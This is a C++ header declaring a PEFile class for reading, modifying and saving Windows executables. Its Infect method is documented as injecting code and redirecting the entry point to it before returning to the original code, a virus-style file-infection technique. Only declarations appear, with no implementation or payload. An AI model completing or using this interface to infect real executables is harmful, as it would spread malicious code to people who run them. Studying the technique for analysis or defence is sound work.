#ifndef PE_FILE_H
#define PE_FILE_H

#include <Windows.h>
#include <string>

class PEFile
{
public:
	PEFile(char const* filePath);
	PEFile(PEFile const& rhs);
	~PEFile(void);

	PEFile& operator=(PEFile const& rhs);

	void Save(void) const;
	void SaveAs(char const* filePath) const;


	/* Injects code into the PE File and redirects the entry point, so the code flow starts there and eventually redirects it back to the original entry point

	code = pointer to code of the infection
	size = size of the infection's code
	originalEntryPointOffset = offset, where the addr to the original entry point will be copied, so code can jump / ret back to the original code flow
	newEntryPointOffset = offset to the entry point in the code (  code + offset = new entry point), incase we inject more functions and entry point is not on the top 
	*/
	void Infect(char const* code, size_t size, DWORD originalEntryPointOffset, DWORD newEntryPointOffset = 0);


	size_t GetFileSize(void) const;
	size_t GetNumberOfSections(void) const;


private:
	static size_t AlignSize(size_t size, size_t alingment);
	void LoadFile(void);
	void ReallocateBuffer(size_t size);
	void UpdateHeaderPointers(void);
	void ExpandLastSection(size_t size);


	std::string				m_filePath;
	char*					m_fileBuffer;
	size_t					m_fileSize;
	size_t					m_bufferSize;

	IMAGE_DOS_HEADER*		m_dosHeader;
	IMAGE_NT_HEADERS*		m_ntHeaders;
	IMAGE_SECTION_HEADER*	m_firstSectionHeader;
};


#endif